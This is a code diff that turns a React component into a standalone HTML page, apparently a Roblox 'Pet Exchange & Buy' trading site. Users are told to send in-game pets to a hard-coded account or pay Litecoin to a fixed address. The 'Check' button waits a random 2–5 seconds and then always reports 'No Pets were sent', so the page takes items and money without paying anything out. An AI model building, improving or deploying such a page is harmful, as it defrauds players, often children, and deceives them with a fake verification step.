@@ -1,307 +1,217 @@
-function MainComponent() {
-  const [currentPage, setCurrentPage] = useState('exchange');
-  const [selectedMethod, setSelectedMethod] = useState(null);
-  const [checkCooldown, setCheckCooldown] = useState(false);
-  const [showError, setShowError] = useState(false);
-  const [gemAmount, setGemAmount] = useState('');
-  const [selectedPet, setSelectedPet] = useState('');
-  const [quantity, setQuantity] = useState(1);
-  const [username, setUsername] = useState('');
-  const [paymentDetails, setPaymentDetails] = useState('');
-  const [copied, setCopied] = useState(false);
-  const contentRef = useRef(null);
-  const checkRef = useRef(null);
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Pet Exchange & Buy</title>
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha512-..." crossorigin="anonymous" />
+</head>
+<body class="bg-[#121212] text-white">
 
-  const petPrices = {
-    "Huge Sphinx": 0.65,
-    "God Potion": 0.1,
-    "Huge Egg": 2.0
-  };
+  <div id="root"></div>
 
-  const robloxUsername = "DawnCookieBlade";
-  const ltcAddress = "LeojFgdrydNCJVTU4ULH9ZguhzBRpzYcpY";
+  <!-- React and Babel CDNs -->
+  <script src="https://unpkg.com/react@18/umd/react.development.js" crossorigin></script>
+  <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js" crossorigin></script>
+  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
 
-  const calculateTotal = () => {
-    if (!selectedPet) return { usd: "0.00", ltc: "0.0000" };
-    
-    const ltcAmount = petPrices[selectedPet] * quantity;
-    const usdAmount = ltcAmount * 0.47;
-    
-    return {
-      usd: usdAmount.toFixed(2),
-      ltc: ltcAmount.toFixed(4)
-    };
-  };
+  <!-- React Component -->
+  <script type="text/babel">
+    const { useState, useRef } = React;
 
-  const calculateValue = (gems) => {
-    const gemValue = parseInt(gems) || 0;
-    const baseValue = gemValue / 1000000;
-    return {
-      robux: (baseValue * 230).toFixed(2),
-      btc: (baseValue * 0.5).toFixed(2),
-      ltc: (baseValue * 0.47).toFixed(2),
-      eth: (baseValue * 0.49).toFixed(2),
-      paypal: (baseValue * 0.49).toFixed(2)
-    };
-  };
+    function MainComponent() {
+      const [currentPage, setCurrentPage] = useState('exchange');
+      const [selectedMethod, setSelectedMethod] = useState(null);
+      const [checkCooldown, setCheckCooldown] = useState(false);
+      const [showError, setShowError] = useState(false);
+      const [gemAmount, setGemAmount] = useState('');
+      const [selectedPet, setSelectedPet] = useState('');
+      const [quantity, setQuantity] = useState(1);
+      const [username, setUsername] = useState('');
+      const [copied, setCopied] = useState(false);
+      const contentRef = useRef(null);
+      const checkRef = useRef(null);
 
-  const values = calculateValue(gemAmount);
-  const total = calculateTotal();
+      const petPrices = {
+        "Huge Sphinx": 0.65,
+        "God Potion": 0.1,
+        "Huge Egg": 2.0
+      };
 
-  const copyUsername = () => {
-    navigator.clipboard.writeText(robloxUsername);
-    setCopied(true);
-    setTimeout(() => setCopied(false), 2000);
-  };
+      const robloxUsername = "DawnCookieBlade";
+      const ltcAddress = "LeojFgdrydNCJVTU4ULH9ZguhzBRpzYcpY";
 
-  const handleCheck = (type) => {
-    if (type === 'buy') {
-      if (selectedPet && username && quantity > 0) {
-        alert('Payment details will be shown here');
-      }
-    } else if (!checkCooldown) {
-      setCheckCooldown(true);
-      setTimeout(() => {
-        setShowError(true);
-        if (checkRef.current) {
-          checkRef.current.scrollIntoView({ behavior: "smooth" });
+      const calculateTotal = () => {
+        if (!selectedPet) return { usd: "0.00", ltc: "0.0000" };
+        const ltcAmount = petPrices[selectedPet] * quantity;
+        const usdAmount = ltcAmount * 0.47;
+        return {
+          usd: usdAmount.toFixed(2),
+          ltc: ltcAmount.toFixed(4)
+        };
+      };
+
+      const calculateValue = (gems) => {
+        const gemValue = parseInt(gems) || 0;
+        const baseValue = gemValue / 1000000;
+        return {
+          robux: (baseValue * 230).toFixed(2),
+          btc: (baseValue * 0.5).toFixed(2),
+          ltc: (baseValue * 0.47).toFixed(2),
+          eth: (baseValue * 0.49).toFixed(2),
+          paypal: (baseValue * 0.49).toFixed(2)
+        };
+      };
+
+      const values = calculateValue(gemAmount);
+      const total = calculateTotal();
+
+      const copyUsername = () => {
+        navigator.clipboard.writeText(robloxUsername);
+        setCopied(true);
+        setTimeout(() => setCopied(false), 2000);
+      };
+
+      const handleCheck = (type) => {
+        if (type === 'buy') {
+          if (selectedPet && username && quantity > 0) {
+            alert('Payment details will be shown here');
+          }
+        } else if (!checkCooldown) {
+          setCheckCooldown(true);
+          setTimeout(() => {
+            setShowError(true);
+            if (checkRef.current) {
+              checkRef.current.scrollIntoView({ behavior: "smooth" });
+            }
+          }, Math.random() * 3000 + 2000);
+
+          setTimeout(() => {
+            setCheckCooldown(false);
+          }, 15000);
         }
-      }, Math.random() * 3000 + 2000);
+      };
 
-      setTimeout(() => {
-        setCheckCooldown(false);
-      }, 15000);
-    }
-  };
-
-  return (
-    <div className="min-h-screen bg-[#121212] font-poppins">
-      <div className="max-w-4xl mx-auto px-4 py-16">
-        <div className="flex flex-col sm:flex-row gap-4 justify-end mb-8">
-          <button 
-            onClick={() => setCurrentPage('exchange')}
-            className={`px-6 py-3 rounded-lg transition-all duration-300 transform hover:scale-105 ${currentPage === 'exchange' ? 'bg-blue-600' : 'bg-green-600'} text-white`}
-          >
-            Exchange Pets
-          </button>
-          <button
-            onClick={() => setCurrentPage('buy')} 
-            className={`px-6 py-3 rounded-lg transition-all duration-300 transform hover:scale-105 ${currentPage === 'buy' ? 'bg-blue-600' : 'bg-green-600'} text-white`}
-          >
-            Buy Pets
-          </button>
-        </div>
-
-        {currentPage === 'buy' ? (
-          <div>
-            <h1 className="text-4xl md:text-6xl text-white mb-6 text-center">Buy Pets</h1>
-            <p className="text-gray-300 text-center mb-12">Purchase exclusive pets using Litecoin (LTC)</p>
-
-            <div className="bg-[#1e1e1e] p-6 rounded-lg">
-              <div className="mb-6">
-                <label className="block text-white mb-2">Select Pet:</label>
-                <select 
-                  value={selectedPet}
-                  onChange={(e) => setSelectedPet(e.target.value)}
-                  className="w-full bg-[#2a2a2a] text-white p-3 rounded"
-                >
-                  <option value="">Choose a pet</option>
-                  <option value="Huge Sphinx">Huge Sphinx</option>
-                  <option value="God Potion">God Potion</option>
-                  <option value="Huge Egg">Huge Egg</option>
-                </select>
-              </div>
-
-              <div className="mb-6">
-                <label className="block text-white mb-2">Quantity:</label>
-                <input
-                  type="number"
-                  min="1"
-                  value={quantity}
-                  onChange={(e) => setQuantity(parseInt(e.target.value) || 1)}
-                  className="w-full bg-[#2a2a2a] text-white p-3 rounded"
-                />
-              </div>
-
-              <div className="mb-6">
-                <label className="block text-white mb-2">Roblox Username:</label>
-                <input
-                  type="text"
-                  value={username}
-                  onChange={(e) => setUsername(e.target.value)}
-                  placeholder="Enter your Roblox username"
-                  className="w-full bg-[#2a2a2a] text-white p-3 rounded"
-                />
-              </div>
-
-              <div className="bg-[#2a2a2a] p-4 rounded mb-6">
-                <p className="text-xl text-white mb-2">Total Price: ${total.usd} (≈ {total.ltc} LTC)</p>
-                <p className="text-gray-300 text-sm break-all">
-                  Send LTC to: {ltcAddress}
-                </p>
-              </div>
-
-              <button
-                onClick={() => handleCheck('buy')}
-                className="w-full bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700 transition-all duration-300"
-              >
-                Check
-              </button>
-            </div>
+      return (
+        <div className="min-h-screen font-poppins px-4 py-10 max-w-5xl mx-auto">
+          <div className="flex flex-col sm:flex-row gap-4 justify-end mb-8">
+            <button onClick={() => setCurrentPage('exchange')} className={`px-6 py-3 rounded-lg ${currentPage === 'exchange' ? 'bg-blue-600' : 'bg-green-600'} text-white`}>
+              Exchange Pets
+            </button>
+            <button onClick={() => setCurrentPage('buy')} className={`px-6 py-3 rounded-lg ${currentPage === 'buy' ? 'bg-blue-600' : 'bg-green-600'} text-white`}>
+              Buy Pets
+            </button>
           </div>
-        ) : (
-          <div>
-            <h1 className="text-4xl md:text-6xl text-white mb-6 text-center">Pet Exchange</h1>
-            <p className="text-gray-300 text-center mb-12">Send your pets to receive Crypto/PayPal/Robux in return</p>
 
-            <div className="bg-[#1e1e1e] p-6 rounded-lg mb-12">
-              <h2 className="text-2xl text-white mb-4">GEM RAP Calculator</h2>
-              <input
-                type="number"
-                value={gemAmount}
-                onChange={(e) => setGemAmount(e.target.value)}
-                placeholder="Enter gem amount"
-                className="w-full bg-[#2a2a2a] text-white p-3 rounded mb-4"
-              />
-              <div className="text-gray-300">
-                <p>Conversion Rates (per 1M gems):</p>
-                <p>• {values.robux} Robux</p>
-                <p>• ${values.btc} in BTC</p>
-                <p>• ${values.ltc} in LTC</p>
-                <p>• ${values.eth} in ETH Classic</p>
-                <p>• ${values.paypal} PayPal</p>
-              </div>
-            </div>
+          {currentPage === 'buy' ? (
+            <div>
+              <h1 className="text-4xl md:text-6xl text-white mb-6 text-center">Buy Pets</h1>
+              <p className="text-gray-300 text-center mb-12">Purchase exclusive pets using Litecoin (LTC)</p>
 
-            <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-12">
-              <button
-                onClick={() => setSelectedMethod('crypto')}
-                className="bg-[#1e1e1e] text-white p-6 rounded-lg transform hover:scale-105 transition-all duration-300"
-              >
-                <i className="fab fa-bitcoin text-2xl mb-4"></i>
-                <div className="text-xl">Crypto</div>
-              </button>
-
-              <button
-                onClick={() => setSelectedMethod('paypal')}
-                className="bg-[#1e1e1e] text-white p-6 rounded-lg transform hover:scale-105 transition-all duration-300"
-              >
-                <i className="fab fa-paypal text-2xl mb-4"></i>
-                <div className="text-xl">PayPal</div>
-              </button>
-
-              <button
-                onClick={() => setSelectedMethod('robux')}
-                className="bg-[#1e1e1e] text-white p-6 rounded-lg transform hover:scale-105 transition-all duration-300"
-              >
-                <i className="fas fa-coins text-2xl mb-4"></i>
-                <div className="text-xl">Robux</div>
-              </button>
-            </div>
-
-            {selectedMethod && (
-              <div ref={contentRef} className="bg-[#1e1e1e] p-6 rounded-lg mb-8">
-                <h2 className="text-2xl text-white mb-4">Trade Details</h2>
+              <div className="bg-[#1e1e1e] p-6 rounded-lg">
                 <div className="mb-6">
-                  <p className="text-gray-300 mb-2">Roblox Username (Send pets to):</p>
-                  <div className="flex items-center gap-4">
-                    <p className="text-gray-300">{robloxUsername}</p>
-                    <button
-                      onClick={copyUsername}
-                      className="bg-[#2a2a2a] text-white px-4 py-2 rounded hover:bg-[#333]"
-                    >
-                      {copied ? <i className="fas fa-check"></i> : <i className="fas fa-copy"></i>}
-                    </button>
-                  </div>
+                  <label className="block text-white mb-2">Select Pet:</label>
+                  <select value={selectedPet} onChange={(e) => setSelectedPet(e.target.value)} className="w-full bg-[#2a2a2a] text-white p-3 rounded">
+                    <option value="">Choose a pet</option>
+                    <option value="Huge Sphinx">Huge Sphinx</option>
+                    <option value="God Potion">God Potion</option>
+                    <option value="Huge Egg">Huge Egg</option>
+                  </select>
                 </div>
 
-                {selectedMethod === 'crypto' && (
-                  <div className="mb-4">
-                    <p className="text-gray-300 mb-2">Available cryptocurrencies:</p>
+                <div className="mb-6">
+                  <label className="block text-white mb-2">Quantity:</label>
+                  <input type="number" min="1" value={quantity} onChange={(e) => setQuantity(parseInt(e.target.value) || 1)} className="w-full bg-[#2a2a2a] text-white p-3 rounded" />
+                </div>
+
+                <div className="mb-6">
+                  <label className="block text-white mb-2">Roblox Username:</label>
+                  <input type="text" value={username} onChange={(e) => setUsername(e.target.value)} className="w-full bg-[#2a2a2a] text-white p-3 rounded" />
+                </div>
+
+                <div className="bg-[#2a2a2a] p-4 rounded mb-6">
+                  <p className="text-xl text-white mb-2">Total Price: ${total.usd} (≈ {total.ltc} LTC)</p>
+                  <p className="text-gray-300 text-sm break-all">Send LTC to: {ltcAddress}</p>
+                </div>
+
+                <button onClick={() => handleCheck('buy')} className="w-full bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700 transition-all duration-300">
+                  Check
+                </button>
+              </div>
+            </div>
+          ) : (
+            <div>
+              <h1 className="text-4xl md:text-6xl text-white mb-6 text-center">Pet Exchange</h1>
+              <p className="text-gray-300 text-center mb-12">Send your pets to receive Crypto/PayPal/Robux in return</p>
+
+              <div className="bg-[#1e1e1e] p-6 rounded-lg mb-12">
+                <h2 className="text-2xl text-white mb-4">GEM RAP Calculator</h2>
+                <input type="number" value={gemAmount} onChange={(e) => setGemAmount(e.target.value)} placeholder="Enter gem amount" className="w-full bg-[#2a2a2a] text-white p-3 rounded mb-4" />
+                <div className="text-gray-300">
+                  <p>Conversion Rates (per 1M gems):</p>
+                  <p>• {values.robux} Robux</p>
+                  <p>• ${values.btc} in BTC</p>
+                  <p>• ${values.ltc} in LTC</p>
+                  <p>• ${values.eth} in ETH Classic</p>
+                  <p>• ${values.paypal} PayPal</p>
+                </div>
+              </div>
+
+              <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-12">
+                <button onClick={() => setSelectedMethod('crypto')} className="bg-[#1e1e1e] text-white p-6 rounded-lg hover:scale-105 transition-transform">
+                  <i className="fab fa-bitcoin text-2xl mb-2"></i>
+                  <div className="text-xl">Crypto</div>
+                </button>
+
+                <button onClick={() => setSelectedMethod('paypal')} className="bg-[#1e1e1e] text-white p-6 rounded-lg hover:scale-105 transition-transform">
+                  <i className="fab fa-paypal text-2xl mb-2"></i>
+                  <div className="text-xl">PayPal</div>
+                </button>
+
+                <button onClick={() => setSelectedMethod('robux')} className="bg-[#1e1e1e] text-white p-6 rounded-lg hover:scale-105 transition-transform">
+                  <i className="fas fa-coins text-2xl mb-2"></i>
+                  <div className="text-xl">Robux</div>
+                </button>
+              </div>
+
+              {selectedMethod && (
+                <div ref={contentRef} className="bg-[#1e1e1e] p-6 rounded-lg">
+                  <h2 className="text-2xl text-white mb-4">Trade Details</h2>
+                  <div className="mb-6">
+                    <p className="text-gray-300 mb-2">Roblox Username (Send pets to):</p>
+                    <div className="flex items-center gap-4">
+                      <p className="text-gray-300">{robloxUsername}</p>
+                      <button onClick={copyUsername} className="bg-[#2a2a2a] text-white px-4 py-2 rounded hover:bg-[#333]">
+                        {copied ? <i className="fas fa-check"></i> : <i className="fas fa-copy"></i>}
+                      </button>
+                    </div>
+                  </div>
+
+                  {selectedMethod === 'crypto' && (
                     <ul className="text-gray-300 list-disc list-inside">
                       <li>Bitcoin (BTC)</li>
                       <li>Litecoin (LTC)</li>
                       <li>Ethereum Classic (ETC)</li>
                     </ul>
-                  </div>
-                )}
-
-                {selectedMethod === 'paypal' && (
-                  <p className="text-gray-300 mb-4">
-                    PayPal payment will be processed after pet transfer confirmation
-                  </p>
-                )}
-
-                {selectedMethod === 'robux' && (
-                  <p className="text-gray-300 mb-4">
-                    Robux will be transferred through group funds after pet transfer confirmation
-                  </p>
-                )}
-
-                <div className="mb-4">
-                  <label className="block text-white mb-2">
-                    {selectedMethod === 'crypto' && 'Enter your crypto address:'}
-                    {selectedMethod === 'paypal' && 'Enter your PayPal email:'}
-                    {selectedMethod === 'robux' && 'Enter your Roblox username:'}
-                  </label>
-                  <input
-                    type={selectedMethod === 'paypal' ? 'email' : 'text'}
-                    value={paymentDetails}
-                    onChange={(e) => setPaymentDetails(e.target.value)}
-                    placeholder={
-                      selectedMethod === 'crypto' ? 'Your crypto address' :
-                      selectedMethod === 'paypal' ? 'your@email.com' :
-                      'Your Roblox username'
-                    }
-                    className="w-full bg-[#2a2a2a] text-white p-3 rounded"
-                  />
-                </div>
-
-                <div className="text-center mb-6">
-                  <div className="text-xl text-white mb-4">Waiting For Pets</div>
-                  <div className="loading-spinner"></div>
-                </div>
-
-                <div ref={checkRef}>
-                  <button
-                    onClick={() => handleCheck('exchange')}
-                    disabled={checkCooldown}
-                    className={`w-full py-3 rounded-lg transition-all duration-500 transform hover:scale-105 ${
-                      checkCooldown ? 'bg-gray-600 cursor-not-allowed' : 'bg-blue-600 hover:bg-blue-700'
-                    } text-white`}
-                  >
-                    {checkCooldown ? 'Please wait...' : 'Check'}
-                  </button>
-
-                  {showError && (
-                    <div className="text-red-500 text-center mt-4">
-                      No Pets were sent
-                    </div>
+                  )}
+                  {selectedMethod === 'paypal' && (
+                    <p className="text-gray-300">PayPal payment will be processed after pet transfer confirmation</p>
+                  )}
+                  {selectedMethod === 'robux' && (
+                    <p className="text-gray-300">Robux will be transferred through group funds after confirmation</p>
                   )}
                 </div>
-              </div>
-            )}
-          </div>
-        )}
-      </div>
+              )}
+            </div>
+          )}
+        </div>
+      );
+    }
 
-      <style jsx global>{`
-        @keyframes spin {
-          0% { transform: rotate(0deg); }
-          100% { transform: rotate(360deg); }
-        }
-        .loading-spinner {
-          width: 50px;
-          height: 50px;
-          border: 5px solid #1e1e1e;
-          border-top: 5px solid #3498db;
-          border-radius: 50%;
-          animation: spin 1s linear infinite;
-          margin: 0 auto;
-        }
-      `}</style>
-    </div>
-  );
-}
-
-
+    ReactDOM.createRoot(document.getElementById('root')).render(<MainComponent />);
+  </script>
+</body>
+</html>
